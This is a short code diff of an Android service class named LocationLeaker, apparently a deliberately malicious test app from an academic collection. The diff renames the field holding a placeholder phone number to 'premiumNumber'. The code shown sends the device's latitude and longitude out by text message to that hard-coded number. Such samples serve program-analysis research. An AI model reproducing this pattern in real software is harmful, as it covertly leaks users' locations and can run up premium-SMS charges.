@@ -7,7 +7,7 @@ import android.util.Log;
 
 public class LocationLeaker extends Service {
 
-    String phoneNumber="5554443333";
+    String premiumNumber="5554443333";
     public LocationLeaker() {
     }
 
@@ -33,7 +33,7 @@ public class LocationLeaker extends Service {
         //send the location via a text message
         Intent i = new Intent();
         i.setAction("edu.uci.seal.action.SEND_SMS");
-        i.putExtra("PHONE_NUMBER", phoneNumber);
+        i.putExtra("PHONE_NUMBER", premiumNumber);
         i.putExtra("TEXT_MSG", "longitude:"+longitude+", latitude:"+latitude);
         startService(i);
 
